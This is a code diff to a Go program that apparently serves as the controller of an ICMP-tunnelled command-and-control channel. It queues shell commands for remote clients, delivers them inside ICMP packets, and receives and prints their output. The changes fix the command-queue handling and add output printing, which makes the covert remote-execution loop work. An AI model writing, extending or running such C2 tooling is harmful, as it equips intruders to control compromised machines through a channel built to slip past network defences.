@@ -18,7 +18,7 @@ func serveCommands(cmdCh chan string, outCh chan string) {
 		for {
 			select {
 			case p := <-ch:
-				handlePacket(p, cmds, outCh)
+				cmds = handlePacket(p, cmds, outCh)
 				break
 			case cmd := <- cmdCh:
 				cmds = append(cmds, cmd)
@@ -28,7 +28,7 @@ func serveCommands(cmdCh chan string, outCh chan string) {
 	}
 }
 
-func handlePacket(p *transport.Packet, cmds []string, outCh chan string) {
+func handlePacket(p *transport.Packet, cmds []string, outCh chan string) []string {
 	switch p.Message.Code {
 	case transport.IcmpCodeCommandRequest:
 		// reply with next command, if any
@@ -41,10 +41,13 @@ func handlePacket(p *transport.Packet, cmds []string, outCh chan string) {
 		break
 	case transport.IcmpCodeCommandOutput:
 		// pass the command out thru the channel
+		log.Println(p.Body.Data)
 		outCh <- string(p.Body.Data)
 		go transport.Send(*p.From, []byte(""), transport.IcmpCodeAck)
 		break
 	}
+
+	return cmds
 }
 
 func main() {
@@ -54,9 +57,18 @@ func main() {
 	defer close(outCh)
 
 	var wg sync.WaitGroup
-	wg.Add(2)
+	wg.Add(3)
 
 	go serveCommands(cmdCh, outCh)
+	go func() {
+		for {
+			select {
+			case o := <-outCh:
+				fmt.Println(o)
+				break
+			}
+		}
+	}()
 	go func() {
 		for {
 			fmt.Print("> ")
